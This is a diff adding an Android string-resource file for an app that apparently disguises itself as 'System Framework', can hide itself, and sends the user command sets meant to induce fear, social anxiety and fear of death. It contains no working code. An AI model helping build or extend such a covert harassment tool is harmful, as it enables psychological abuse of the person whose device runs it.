@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Framework</string>
+    <string name="app_name_hidden">Schizophrenia</string>
+    <string name="prefTitle">Settings</string>
+    <string name="prefUseHideTitle">Turn Invisible</string>
+    <string name="prefUseHideSummary">Lockdown and hide the application.</string>
+  
+    <string-array name="command_titles">
+        <item>You\'re in danger !</item>
+        <item>People hate you !</item>
+        <item>You\'re going to die !</item>
+    </string-array>
+    
+    <string-array name="command_descriptions">
+        <item>A series of commands inducing fear.</item>
+        <item>A series of commands inducing social anxiety.</item>
+        <item>A series of commands inducing fear of death.</item>
+    </string-array>
+    
+</resources>
